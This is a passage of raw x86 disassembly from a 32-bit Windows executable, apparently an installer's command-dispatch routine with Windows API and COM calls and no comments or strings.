  401dd2:	8b c1                	mov    %ecx,%eax
  401dd4:	8b f1                	mov    %ecx,%esi
  401dd6:	83 e0 03             	and    $0x3,%eax
  401dd9:	83 e6 04             	and    $0x4,%esi
  401ddc:	89 45 c8             	mov    %eax,-0x38(%ebp)
  401ddf:	8b c1                	mov    %ecx,%eax
  401de1:	c1 e8 1f             	shr    $0x1f,%eax
  401de4:	89 45 e8             	mov    %eax,-0x18(%ebp)
  401de7:	8b c1                	mov    %ecx,%eax
  401de9:	c1 e8 1e             	shr    $0x1e,%eax
  401dec:	83 e0 01             	and    $0x1,%eax
  401def:	f7 c1 00 00 01 00    	test   $0x10000,%ecx
  401df5:	89 45 c0             	mov    %eax,-0x40(%ebp)
  401df8:	74 09                	je     0x401e03
  401dfa:	6a 11                	push   $0x11
  401dfc:	e8 d1 0f 00 00       	call   0x402dd2
  401e01:	eb 04                	jmp    0x401e07
  401e03:	0f b7 45 d4          	movzwl -0x2c(%ebp),%eax
  401e07:	89 45 bc             	mov    %eax,-0x44(%ebp)
  401e0a:	8d 45 a0             	lea    -0x60(%ebp),%eax
  401e0d:	50                   	push   %eax
  401e0e:	ff 75 08             	push   0x8(%ebp)
  401e11:	ff 15 64 82 40 00    	call   *0x408264
  401e17:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401e1a:	25 f0 fe 00 00       	and    $0xfef0,%eax
  401e1f:	50                   	push   %eax
  401e20:	8b 45 ac             	mov    -0x54(%ebp),%eax
  401e23:	0f af 45 c0          	imul   -0x40(%ebp),%eax
  401e27:	50                   	push   %eax
  401e28:	8b 45 a8             	mov    -0x58(%ebp),%eax
  401e2b:	0f af 45 e8          	imul   -0x18(%ebp),%eax
  401e2f:	50                   	push   %eax
  401e30:	ff 75 c8             	push   -0x38(%ebp)
  401e33:	f7 de                	neg    %esi
  401e35:	ff 75 bc             	push   -0x44(%ebp)
  401e38:	1b f6                	sbb    %esi,%esi
  401e3a:	23 35 20 9a 42 00    	and    0x429a20,%esi
  401e40:	56                   	push   %esi
  401e41:	ff 15 44 82 40 00    	call   *0x408244
  401e47:	8b f0                	mov    %eax,%esi
  401e49:	56                   	push   %esi
  401e4a:	ff 75 c8             	push   -0x38(%ebp)
  401e4d:	68 72 01 00 00       	push   $0x172
  401e52:	ff 75 08             	push   0x8(%ebp)
  401e55:	ff 15 58 82 40 00    	call   *0x408258
  401e5b:	3b c3                	cmp    %ebx,%eax
  401e5d:	74 0c                	je     0x401e6b
  401e5f:	39 5d c8             	cmp    %ebx,-0x38(%ebp)
  401e62:	75 07                	jne    0x401e6b
  401e64:	50                   	push   %eax
  401e65:	ff 15 54 80 40 00    	call   *0x408054
  401e6b:	39 5d d0             	cmp    %ebx,-0x30(%ebp)
  401e6e:	0f 8c e2 0d 00 00    	jl     0x402c56
  401e74:	56                   	push   %esi
  401e75:	e9 18 f7 ff ff       	jmp    0x401592
  401e7a:	ff 75 f8             	push   -0x8(%ebp)
  401e7d:	ff 15 48 82 40 00    	call   *0x408248
  401e83:	6a 02                	push   $0x2
  401e85:	8b f0                	mov    %eax,%esi
  401e87:	e8 24 0f 00 00       	call   0x402db0
  401e8c:	59                   	pop    %ecx
  401e8d:	8b d8                	mov    %eax,%ebx
  401e8f:	6a 48                	push   $0x48
  401e91:	6a 5a                	push   $0x5a
  401e93:	56                   	push   %esi
  401e94:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401e97:	ff 15 48 80 40 00    	call   *0x408048
  401e9d:	50                   	push   %eax
  401e9e:	53                   	push   %ebx
  401e9f:	ff 15 48 81 40 00    	call   *0x408148
  401ea5:	56                   	push   %esi
  401ea6:	ff 75 f8             	push   -0x8(%ebp)
  401ea9:	f7 d8                	neg    %eax
  401eab:	a3 c8 cd 40 00       	mov    %eax,0x40cdc8
  401eb0:	ff 15 4c 82 40 00    	call   *0x40824c
  401eb6:	6a 03                	push   $0x3
  401eb8:	e8 f3 0e 00 00       	call   0x402db0
  401ebd:	a3 d8 cd 40 00       	mov    %eax,0x40cdd8
  401ec2:	8a 45 e0             	mov    -0x20(%ebp),%al
  401ec5:	59                   	pop    %ecx
  401ec6:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401ec9:	ff 75 d4             	push   -0x2c(%ebp)
  401ecc:	8a c8                	mov    %al,%cl
  401ece:	80 e1 01             	and    $0x1,%cl
  401ed1:	c6 05 df cd 40 00 01 	movb   $0x1,0x40cddf
  401ed8:	88 0d dc cd 40 00    	mov    %cl,0x40cddc
  401ede:	8a c8                	mov    %al,%cl
  401ee0:	80 e1 02             	and    $0x2,%cl
  401ee3:	24 04                	and    $0x4,%al
  401ee5:	68 e4 cd 40 00       	push   $0x40cde4
  401eea:	88 0d dd cd 40 00    	mov    %cl,0x40cddd
  401ef0:	a2 de cd 40 00       	mov    %al,0x40cdde
  401ef5:	e8 cc 46 00 00       	call   0x4065c6
  401efa:	68 c8 cd 40 00       	push   $0x40cdc8
  401eff:	ff 15 5c 80 40 00    	call   *0x40805c
  401f05:	e9 5a 07 00 00       	jmp    0x402664
  401f0a:	53                   	push   %ebx
  401f0b:	e8 a0 0e 00 00       	call   0x402db0
  401f10:	6a 01                	push   $0x1
  401f12:	8b f0                	mov    %eax,%esi
  401f14:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401f17:	e8 94 0e 00 00       	call   0x402db0
  401f1c:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  401f1f:	59                   	pop    %ecx
  401f20:	59                   	pop    %ecx
  401f21:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401f24:	50                   	push   %eax
  401f25:	56                   	push   %esi
  401f26:	75 0b                	jne    0x401f33
  401f28:	ff 15 28 82 40 00    	call   *0x408228
  401f2e:	e9 23 0d 00 00       	jmp    0x402c56
  401f33:	ff 15 50 82 40 00    	call   *0x408250
  401f39:	e9 18 0d 00 00       	jmp    0x402c56
  401f3e:	53                   	push   %ebx
  401f3f:	e8 8e 0e 00 00       	call   0x402dd2
  401f44:	6a 31                	push   $0x31
  401f46:	8b f0                	mov    %eax,%esi
  401f48:	e8 85 0e 00 00       	call   0x402dd2
  401f4d:	6a 22                	push   $0x22
  401f4f:	8b d8                	mov    %eax,%ebx
  401f51:	e8 7c 0e 00 00       	call   0x402dd2
  401f56:	6a 15                	push   $0x15
  401f58:	8b f8                	mov    %eax,%edi
  401f5a:	e8 73 0e 00 00       	call   0x402dd2
  401f5f:	6a ec                	push   $0xffffffec
  401f61:	e8 bd f4 ff ff       	call   0x401423
  401f66:	8b 45 e0             	mov    -0x20(%ebp),%eax
  401f69:	89 85 78 ff ff ff    	mov    %eax,-0x88(%ebp)
  401f6f:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401f72:	89 85 7c ff ff ff    	mov    %eax,-0x84(%ebp)
  401f78:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401f7b:	89 45 90             	mov    %eax,-0x70(%ebp)
  401f7e:	66 8b 06             	mov    (%esi),%ax
  401f81:	66 f7 d8             	neg    %ax
  401f84:	1b c0                	sbb    %eax,%eax
  401f86:	89 5d 84             	mov    %ebx,-0x7c(%ebp)
  401f89:	23 c6                	and    %esi,%eax
  401f8b:	89 45 80             	mov    %eax,-0x80(%ebp)
  401f8e:	66 8b 07             	mov    (%edi),%ax
  401f91:	66 f7 d8             	neg    %ax
  401f94:	1b c0                	sbb    %eax,%eax
  401f96:	c7 45 8c 00 50 43 00 	movl   $0x435000,-0x74(%ebp)
  401f9d:	23 c7                	and    %edi,%eax
  401f9f:	89 45 88             	mov    %eax,-0x78(%ebp)
  401fa2:	8d 85 74 ff ff ff    	lea    -0x8c(%ebp),%eax
  401fa8:	50                   	push   %eax
  401fa9:	e8 01 3c 00 00       	call   0x405baf
  401fae:	85 c0                	test   %eax,%eax
  401fb0:	0f 84 a4 09 00 00    	je     0x40295a
  401fb6:	f6 85 78 ff ff ff 40 	testb  $0x40,-0x88(%ebp)
  401fbd:	0f 84 93 0c 00 00    	je     0x402c56
  401fc3:	ff 75 ac             	push   -0x54(%ebp)
  401fc6:	e8 5d 4a 00 00       	call   0x406a28
  401fcb:	ff 75 ac             	push   -0x54(%ebp)
  401fce:	eb 47                	jmp    0x402017
  401fd0:	53                   	push   %ebx
  401fd1:	e8 fc 0d 00 00       	call   0x402dd2
  401fd6:	8b f0                	mov    %eax,%esi
  401fd8:	56                   	push   %esi
  401fd9:	6a eb                	push   $0xffffffeb
  401fdb:	e8 2e 36 00 00       	call   0x40560e
  401fe0:	56                   	push   %esi
  401fe1:	e8 86 3b 00 00       	call   0x405b6c
  401fe6:	8b f0                	mov    %eax,%esi
  401fe8:	3b f3                	cmp    %ebx,%esi
  401fea:	0f 84 6a 09 00 00    	je     0x40295a
  401ff0:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
  401ff3:	74 21                	je     0x402016
  401ff5:	56                   	push   %esi
  401ff6:	e8 2d 4a 00 00       	call   0x406a28
  401ffb:	39 5d d4             	cmp    %ebx,-0x2c(%ebp)
  401ffe:	7c 0b                	jl     0x40200b
  402000:	50                   	push   %eax
  402001:	ff 75 f4             	push   -0xc(%ebp)
  402004:	e8 c7 44 00 00       	call   0x4064d0
  402009:	eb 0b                	jmp    0x402016
  40200b:	3b c3                	cmp    %ebx,%eax
  40200d:	74 07                	je     0x402016
  40200f:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402016:	56                   	push   %esi
  402017:	ff 15 fc 80 40 00    	call   *0x4080fc
  40201d:	e9 34 0c 00 00       	jmp    0x402c56
  402022:	6a 02                	push   $0x2
  402024:	e8 a9 0d 00 00       	call   0x402dd2
  402029:	50                   	push   %eax
  40202a:	e8 b7 48 00 00       	call   0x4068e6
  40202f:	8b f0                	mov    %eax,%esi
  402031:	3b f3                	cmp    %ebx,%esi
  402033:	74 13                	je     0x402048
  402035:	ff 76 14             	push   0x14(%esi)
  402038:	ff 75 f4             	push   -0xc(%ebp)
  40203b:	e8 90 44 00 00       	call   0x4064d0
  402040:	ff 76 18             	push   0x18(%esi)
  402043:	e9 4a f5 ff ff       	jmp    0x401592
  402048:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40204b:	66 89 1f             	mov    %bx,(%edi)
  40204e:	66 89 18             	mov    %bx,(%eax)
  402051:	e9 04 09 00 00       	jmp    0x40295a
  402056:	6a ee                	push   $0xffffffee
  402058:	e8 75 0d 00 00       	call   0x402dd2
  40205d:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  402060:	89 45 c8             	mov    %eax,-0x38(%ebp)
  402063:	51                   	push   %ecx
  402064:	50                   	push   %eax
  402065:	6a 0b                	push   $0xb
  402067:	e8 11 49 00 00       	call   0x40697d
  40206c:	ff d0                	call   *%eax
  40206e:	8b f0                	mov    %eax,%esi
  402070:	8b 45 f4             	mov    -0xc(%ebp),%eax
  402073:	66 89 1f             	mov    %bx,(%edi)
  402076:	3b f3                	cmp    %ebx,%esi
  402078:	66 89 18             	mov    %bx,(%eax)
  40207b:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402082:	0f 84 ce 0b 00 00    	je     0x402c56
  402088:	56                   	push   %esi
  402089:	6a 40                	push   $0x40
  40208b:	ff 15 10 81 40 00    	call   *0x408110
  402091:	3b c3                	cmp    %ebx,%eax
  402093:	89 45 08             	mov    %eax,0x8(%ebp)
  402096:	0f 84 ba 0b 00 00    	je     0x402c56
  40209c:	6a 0c                	push   $0xc
  40209e:	e8 da 48 00 00       	call   0x40697d
  4020a3:	6a 0d                	push   $0xd
  4020a5:	89 45 c0             	mov    %eax,-0x40(%ebp)
  4020a8:	e8 d0 48 00 00       	call   0x40697d
  4020ad:	ff 75 08             	push   0x8(%ebp)
  4020b0:	89 45 e8             	mov    %eax,-0x18(%ebp)
  4020b3:	56                   	push   %esi
  4020b4:	53                   	push   %ebx
  4020b5:	ff 75 c8             	push   -0x38(%ebp)
  4020b8:	ff 55 c0             	call   *-0x40(%ebp)
  4020bb:	85 c0                	test   %eax,%eax
  4020bd:	74 3c                	je     0x4020fb
  4020bf:	8d 45 b4             	lea    -0x4c(%ebp),%eax
  4020c2:	50                   	push   %eax
  4020c3:	8d 45 bc             	lea    -0x44(%ebp),%eax
  4020c6:	50                   	push   %eax
  4020c7:	68 14 a0 40 00       	push   $0x40a014
  4020cc:	ff 75 08             	push   0x8(%ebp)
  4020cf:	ff 55 e8             	call   *-0x18(%ebp)
  4020d2:	85 c0                	test   %eax,%eax
  4020d4:	74 25                	je     0x4020fb
  4020d6:	8b 45 bc             	mov    -0x44(%ebp),%eax
  4020d9:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  4020dc:	ff 74 88 08          	push   0x8(%eax,%ecx,4)
  4020e0:	57                   	push   %edi
  4020e1:	e8 ea 43 00 00       	call   0x4064d0
  4020e6:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4020e9:	8b 4d bc             	mov    -0x44(%ebp),%ecx
  4020ec:	ff 74 81 0c          	push   0xc(%ecx,%eax,4)
  4020f0:	ff 75 f4             	push   -0xc(%ebp)
  4020f3:	e8 d8 43 00 00       	call   0x4064d0
  4020f8:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  4020fb:	ff 75 08             	push   0x8(%ebp)
  4020fe:	e9 34 fb ff ff       	jmp    0x401c37
  402103:	39 1d e0 9a 42 00    	cmp    %ebx,0x429ae0
  402109:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402110:	0f 8c b9 00 00 00    	jl     0x4021cf
  402116:	6a f0                	push   $0xfffffff0
  402118:	e8 b5 0c 00 00       	call   0x402dd2
  40211d:	6a 01                	push   $0x1
  40211f:	8b f8                	mov    %eax,%edi
  402121:	e8 ac 0c 00 00       	call   0x402dd2
  402126:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  402129:	89 45 bc             	mov    %eax,-0x44(%ebp)
  40212c:	74 0e                	je     0x40213c
  40212e:	57                   	push   %edi
  40212f:	ff 15 14 81 40 00    	call   *0x408114
  402135:	3b c3                	cmp    %ebx,%eax
  402137:	89 45 08             	mov    %eax,0x8(%ebp)
  40213a:	75 11                	jne    0x40214d
  40213c:	6a 08                	push   $0x8
  40213e:	53                   	push   %ebx
  40213f:	57                   	push   %edi
  402140:	ff 15 18 81 40 00    	call   *0x408118
  402146:	3b c3                	cmp    %ebx,%eax
  402148:	89 45 08             	mov    %eax,0x8(%ebp)
  40214b:	74 7b                	je     0x4021c8
  40214d:	ff 75 bc             	push   -0x44(%ebp)
  402150:	ff 75 08             	push   0x8(%ebp)
  402153:	e8 94 48 00 00       	call   0x4069ec
  402158:	8b f8                	mov    %eax,%edi
  40215a:	3b fb                	cmp    %ebx,%edi
  40215c:	74 39                	je     0x402197
  40215e:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
  402161:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  402164:	74 17                	je     0x40217d
  402166:	ff 75 d8             	push   -0x28(%ebp)
  402169:	e8 b5 f2 ff ff       	call   0x401423
  40216e:	ff d7                	call   *%edi
  402170:	85 c0                	test   %eax,%eax
  402172:	74 2d                	je     0x4021a1
  402174:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  40217b:	eb 24                	jmp    0x4021a1
  40217d:	68 00 a0 40 00       	push   $0x40a000
  402182:	68 28 ce 40 00       	push   $0x40ce28
  402187:	56                   	push   %esi
  402188:	68 00 04 00 00       	push   $0x400
  40218d:	ff 75 f8             	push   -0x8(%ebp)
  402190:	ff d7                	call   *%edi
  402192:	83 c4 14             	add    $0x14,%esp
  402195:	eb 0a                	jmp    0x4021a1
  402197:	ff 75 bc             	push   -0x44(%ebp)
  40219a:	6a f7                	push   $0xfffffff7
  40219c:	e8 6d 34 00 00       	call   0x40560e
  4021a1:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  4021a4:	0f 85 ac 0a 00 00    	jne    0x402c56
  4021aa:	ff 75 08             	push   0x8(%ebp)
  4021ad:	e8 49 1a 00 00       	call   0x403bfb
  4021b2:	85 c0                	test   %eax,%eax
  4021b4:	0f 84 9c 0a 00 00    	je     0x402c56
  4021ba:	ff 75 08             	push   0x8(%ebp)
  4021bd:	ff 15 1c 81 40 00    	call   *0x40811c
  4021c3:	e9 8e 0a 00 00       	jmp    0x402c56
  4021c8:	6a f6                	push   $0xfffffff6
  4021ca:	e9 4e 01 00 00       	jmp    0x40231d
  4021cf:	6a e7                	push   $0xffffffe7
  4021d1:	e9 47 01 00 00       	jmp    0x40231d
  4021d6:	6a f0                	push   $0xfffffff0
  4021d8:	e8 f5 0b 00 00       	call   0x402dd2
  4021dd:	6a df                	push   $0xffffffdf
  4021df:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4021e2:	e8 eb 0b 00 00       	call   0x402dd2
  4021e7:	6a 02                	push   $0x2
  4021e9:	89 45 bc             	mov    %eax,-0x44(%ebp)
  4021ec:	e8 e1 0b 00 00       	call   0x402dd2
  4021f1:	6a cd                	push   $0xffffffcd
  4021f3:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4021f6:	e8 d7 0b 00 00       	call   0x402dd2
  4021fb:	6a 45                	push   $0x45
  4021fd:	89 45 b4             	mov    %eax,-0x4c(%ebp)
  402200:	e8 cd 0b 00 00       	call   0x402dd2
  402205:	ff 75 bc             	push   -0x44(%ebp)
  402208:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40220b:	8b 45 e0             	mov    -0x20(%ebp),%eax
  40220e:	8b c8                	mov    %eax,%ecx
  402210:	8b f8                	mov    %eax,%edi
  402212:	8b f0                	mov    %eax,%esi
  402214:	81 e1 ff 0f 00 00    	and    $0xfff,%ecx
  40221a:	c1 f8 10             	sar    $0x10,%eax
  40221d:	c1 fe 0c             	sar    $0xc,%esi
  402220:	25 ff ff 00 00       	and    $0xffff,%eax
  402225:	89 4d b0             	mov    %ecx,-0x50(%ebp)
  402228:	81 e7 00 80 00 00    	and    $0x8000,%edi
  40222e:	83 e6 07             	and    $0x7,%esi
  402231:	89 45 c0             	mov    %eax,-0x40(%ebp)
  402234:	e8 96 3c 00 00       	call   0x405ecf
  402239:	85 c0                	test   %eax,%eax
  40223b:	75 07                	jne    0x402244
  40223d:	6a 21                	push   $0x21
  40223f:	e8 8e 0b 00 00       	call   0x402dd2
  402244:	8d 45 08             	lea    0x8(%ebp),%eax
  402247:	50                   	push   %eax
  402248:	68 cc 84 40 00       	push   $0x4084cc
  40224d:	6a 01                	push   $0x1
  40224f:	53                   	push   %ebx
  402250:	68 dc 84 40 00       	push   $0x4084dc
  402255:	ff 15 90 82 40 00    	call   *0x408290
  40225b:	3b c3                	cmp    %ebx,%eax
  40225d:	0f 8c b1 00 00 00    	jl     0x402314
  402263:	8b 45 08             	mov    0x8(%ebp),%eax
  402266:	8d 55 c8             	lea    -0x38(%ebp),%edx
  402269:	52                   	push   %edx
  40226a:	68 ec 84 40 00       	push   $0x4084ec
  40226f:	8b 08                	mov    (%eax),%ecx
  402271:	50                   	push   %eax
  402272:	ff 11                	call   *(%ecx)
  402274:	3b c3                	cmp    %ebx,%eax
  402276:	89 45 e8             	mov    %eax,-0x18(%ebp)
  402279:	0f 8c 87 00 00 00    	jl     0x402306
  40227f:	8b 45 08             	mov    0x8(%ebp),%eax
  402282:	ff 75 bc             	push   -0x44(%ebp)
  402285:	8b 08                	mov    (%eax),%ecx
  402287:	50                   	push   %eax
  402288:	ff 51 50             	call   *0x50(%ecx)
  40228b:	3b fb                	cmp    %ebx,%edi
  40228d:	89 45 e8             	mov    %eax,-0x18(%ebp)
  402290:	75 0e                	jne    0x4022a0
  402292:	8b 45 08             	mov    0x8(%ebp),%eax
  402295:	68 00 50 43 00       	push   $0x435000
  40229a:	50                   	push   %eax
  40229b:	8b 08                	mov    (%eax),%ecx
  40229d:	ff 51 24             	call   *0x24(%ecx)
  4022a0:	3b f3                	cmp    %ebx,%esi
  4022a2:	74 0a                	je     0x4022ae
  4022a4:	8b 45 08             	mov    0x8(%ebp),%eax
  4022a7:	56                   	push   %esi
  4022a8:	50                   	push   %eax
  4022a9:	8b 08                	mov    (%eax),%ecx
  4022ab:	ff 51 3c             	call   *0x3c(%ecx)
  4022ae:	8b 45 08             	mov    0x8(%ebp),%eax
  4022b1:	ff 75 c0             	push   -0x40(%ebp)
  4022b4:	8b 08                	mov    (%eax),%ecx
  4022b6:	50                   	push   %eax
  4022b7:	ff 51 34             	call   *0x34(%ecx)
  4022ba:	8b 4d b4             	mov    -0x4c(%ebp),%ecx
  4022bd:	66 39 19             	cmp    %bx,(%ecx)
  4022c0:	74 0d                	je     0x4022cf
  4022c2:	8b 45 08             	mov    0x8(%ebp),%eax
  4022c5:	ff 75 b0             	push   -0x50(%ebp)
  4022c8:	8b 10                	mov    (%eax),%edx
  4022ca:	51                   	push   %ecx
  4022cb:	50                   	push   %eax
  4022cc:	ff 52 44             	call   *0x44(%edx)
  4022cf:	8b 45 08             	mov    0x8(%ebp),%eax
  4022d2:	ff 75 f8             	push   -0x8(%ebp)
  4022d5:	8b 08                	mov    (%eax),%ecx
  4022d7:	50                   	push   %eax
  4022d8:	ff 51 2c             	call   *0x2c(%ecx)
  4022db:	8b 45 08             	mov    0x8(%ebp),%eax
  4022de:	ff 75 f4             	push   -0xc(%ebp)
  4022e1:	8b 08                	mov    (%eax),%ecx
  4022e3:	50                   	push   %eax
  4022e4:	ff 51 1c             	call   *0x1c(%ecx)
  4022e7:	39 5d e8             	cmp    %ebx,-0x18(%ebp)
  4022ea:	7c 11                	jl     0x4022fd
  4022ec:	8b 45 c8             	mov    -0x38(%ebp),%eax
  4022ef:	6a 01                	push   $0x1
  4022f1:	ff 75 f0             	push   -0x10(%ebp)
  4022f4:	8b 08                	mov    (%eax),%ecx
  4022f6:	50                   	push   %eax
  4022f7:	ff 51 18             	call   *0x18(%ecx)
  4022fa:	89 45 e8             	mov    %eax,-0x18(%ebp)
  4022fd:	8b 45 c8             	mov    -0x38(%ebp),%eax
  402300:	50                   	push   %eax
  402301:	8b 08                	mov    (%eax),%ecx
  402303:	ff 51 08             	call   *0x8(%ecx)
  402306:	8b 45 08             	mov    0x8(%ebp),%eax
  402309:	50                   	push   %eax
  40230a:	8b 08                	mov    (%eax),%ecx
  40230c:	ff 51 08             	call   *0x8(%ecx)
  40230f:	39 5d e8             	cmp    %ebx,-0x18(%ebp)
  402312:	7d 13                	jge    0x402327
  402314:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  40231b:	6a f0                	push   $0xfffffff0
  40231d:	e8 01 f1 ff ff       	call   0x401423
  402322:	e9 2f 09 00 00       	jmp    0x402c56
  402327:	6a f4                	push   $0xfffffff4
  402329:	eb f2                	jmp    0x40231d
  40232b:	53                   	push   %ebx
  40232c:	e8 a1 0a 00 00       	call   0x402dd2
  402331:	6a 11                	push   $0x11
  402333:	8b f0                	mov    %eax,%esi
  402335:	e8 98 0a 00 00       	call   0x402dd2
  40233a:	6a 23                	push   $0x23
  40233c:	8b f8                	mov    %eax,%edi
  40233e:	e8 8f 0a 00 00       	call   0x402dd2
  402343:	56                   	push   %esi
  402344:	89 45 08             	mov    %eax,0x8(%ebp)
  402347:	e8 9a 45 00 00       	call   0x4068e6
  40234c:	85 c0                	test   %eax,%eax
  40234e:	75 0d                	jne    0x40235d
  402350:	53                   	push   %ebx
  402351:	6a f9                	push   $0xfffffff9
  402353:	e8 b6 32 00 00       	call   0x40560e
  402358:	e9 fd 05 00 00       	jmp    0x40295a
  40235d:	8b 45 f8             	mov    -0x8(%ebp),%eax
  402360:	56                   	push   %esi
  402361:	89 45 90             	mov    %eax,-0x70(%ebp)
  402364:	c7 45 94 02 00 00 00 	movl   $0x2,-0x6c(%ebp)
  40236b:	e8 2f 42 00 00       	call   0x40659f
  402370:	57                   	push   %edi
  402371:	66 89 5c 46 02       	mov    %bx,0x2(%esi,%eax,2)
  402376:	e8 24 42 00 00       	call   0x40659f
  40237b:	66 89 5c 47 02       	mov    %bx,0x2(%edi,%eax,2)
  402380:	8b 45 08             	mov    0x8(%ebp),%eax
  402383:	66 8b 4d d8          	mov    -0x28(%ebp),%cx
  402387:	50                   	push   %eax
  402388:	53                   	push   %ebx
  402389:	89 75 98             	mov    %esi,-0x68(%ebp)
  40238c:	89 7d 9c             	mov    %edi,-0x64(%ebp)
  40238f:	89 45 aa             	mov    %eax,-0x56(%ebp)
  402392:	66 89 4d a0          	mov    %cx,-0x60(%ebp)
  402396:	e8 73 32 00 00       	call   0x40560e
  40239b:	8d 45 90             	lea    -0x70(%ebp),%eax
  40239e:	50                   	push   %eax
  40239f:	ff 15 80 81 40 00    	call   *0x408180
  4023a5:	85 c0                	test   %eax,%eax
  4023a7:	0f 84 a9 08 00 00    	je     0x402c56
  4023ad:	eb a1                	jmp    0x402350
  4023af:	3d 0d f0 ad 0b       	cmp    $0xbadf00d,%eax
  4023b4:	74 1d                	je     0x4023d3
  4023b6:	68 10 00 20 00       	push   $0x200010
  4023bb:	6a e8                	push   $0xffffffe8
  4023bd:	53                   	push   %ebx
  4023be:	e8 03 42 00 00       	call   0x4065c6
  4023c3:	50                   	push   %eax
  4023c4:	e8 20 38 00 00       	call   0x405be9
  4023c9:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
  4023ce:	e9 8e 08 00 00       	jmp    0x402c61
  4023d3:	ff 05 b4 9a 42 00    	incl   0x429ab4
  4023d9:	e9 78 08 00 00       	jmp    0x402c56
  4023de:	33 f6                	xor    %esi,%esi
  4023e0:	33 ff                	xor    %edi,%edi
  4023e2:	3b c3                	cmp    %ebx,%eax
  4023e4:	74 08                	je     0x4023ee
  4023e6:	53                   	push   %ebx
  4023e7:	e8 e6 09 00 00       	call   0x402dd2
  4023ec:	8b f0                	mov    %eax,%esi
  4023ee:	39 5d d4             	cmp    %ebx,-0x2c(%ebp)
  4023f1:	74 09                	je     0x4023fc
  4023f3:	6a 11                	push   $0x11
  4023f5:	e8 d8 09 00 00       	call   0x402dd2
  4023fa:	8b f8                	mov    %eax,%edi
  4023fc:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  4023ff:	74 09                	je     0x40240a
  402401:	6a 22                	push   $0x22
  402403:	e8 ca 09 00 00       	call   0x402dd2
  402408:	8b d8                	mov    %eax,%ebx
  40240a:	6a cd                	push   $0xffffffcd
  40240c:	e8 c1 09 00 00       	call   0x402dd2
  402411:	50                   	push   %eax
  402412:	53                   	push   %ebx
  402413:	57                   	push   %edi
  402414:	56                   	push   %esi
  402415:	ff 15 20 81 40 00    	call   *0x408120
  40241b:	e9 b9 f1 ff ff       	jmp    0x4015d9
  402420:	a1 10 a0 40 00       	mov    0x40a010,%eax
  402425:	6a 01                	push   $0x1
  402427:	89 45 08             	mov    %eax,0x8(%ebp)
  40242a:	e8 a3 09 00 00       	call   0x402dd2
  40242f:	6a 12                	push   $0x12
  402431:	8b f0                	mov    %eax,%esi
  402433:	e8 9a 09 00 00       	call   0x402dd2
  402438:	6a dd                	push   $0xffffffdd
  40243a:	89 45 f0             	mov    %eax,-0x10(%ebp)
  40243d:	e8 90 09 00 00       	call   0x402dd2
  402442:	50                   	push   %eax
  402443:	68 ff 03 00 00       	push   $0x3ff
  402448:	8d 45 08             	lea    0x8(%ebp),%eax
  40244b:	57                   	push   %edi
  40244c:	50                   	push   %eax
  40244d:	ff 75 f0             	push   -0x10(%ebp)
  402450:	56                   	push   %esi
  402451:	ff 15 24 81 40 00    	call   *0x408124
  402457:	66 83 3f 0a          	cmpw   $0xa,(%edi)
  40245b:	e9 1d f3 ff ff       	jmp    0x40177d
  402460:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  402463:	8b 75 d4             	mov    -0x2c(%ebp),%esi
  402466:	75 2b                	jne    0x402493
  402468:	6a 02                	push   $0x2
  40246a:	e8 a3 09 00 00       	call   0x402e12
  40246f:	8b f0                	mov    %eax,%esi
  402471:	3b f3                	cmp    %ebx,%esi
  402473:	0f 84 e1 04 00 00    	je     0x40295a
  402479:	6a 33                	push   $0x33
  40247b:	e8 52 09 00 00       	call   0x402dd2
  402480:	50                   	push   %eax
  402481:	56                   	push   %esi
  402482:	ff 15 14 80 40 00    	call   *0x408014
  402488:	56                   	push   %esi
  402489:	8b f8                	mov    %eax,%edi
  40248b:	ff 15 10 80 40 00    	call   *0x408010
  402491:	eb 16                	jmp    0x4024a9
  402493:	6a 22                	push   $0x22
  402495:	e8 38 09 00 00       	call   0x402dd2
  40249a:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  40249d:	d1 f9                	sar    $1,%ecx
  40249f:	51                   	push   %ecx
  4024a0:	50                   	push   %eax
  4024a1:	56                   	push   %esi
  4024a2:	e8 e9 09 00 00       	call   0x402e90
  4024a7:	8b f8                	mov    %eax,%edi
  4024a9:	3b fb                	cmp    %ebx,%edi
  4024ab:	0f 84 a5 07 00 00    	je     0x402c56
  4024b1:	e9 a4 04 00 00       	jmp    0x40295a
  4024b6:	8b 75 e0             	mov    -0x20(%ebp),%esi
  4024b9:	8b f8                	mov    %eax,%edi
  4024bb:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  4024be:	6a 02                	push   $0x2
  4024c0:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4024c3:	e8 0a 09 00 00       	call   0x402dd2
  4024c8:	6a 11                	push   $0x11
  4024ca:	89 45 bc             	mov    %eax,-0x44(%ebp)
  4024cd:	e8 00 09 00 00       	call   0x402dd2
  4024d2:	6a 02                	push   $0x2
  4024d4:	50                   	push   %eax
  4024d5:	57                   	push   %edi
  4024d6:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  4024dd:	e8 80 09 00 00       	call   0x402e62
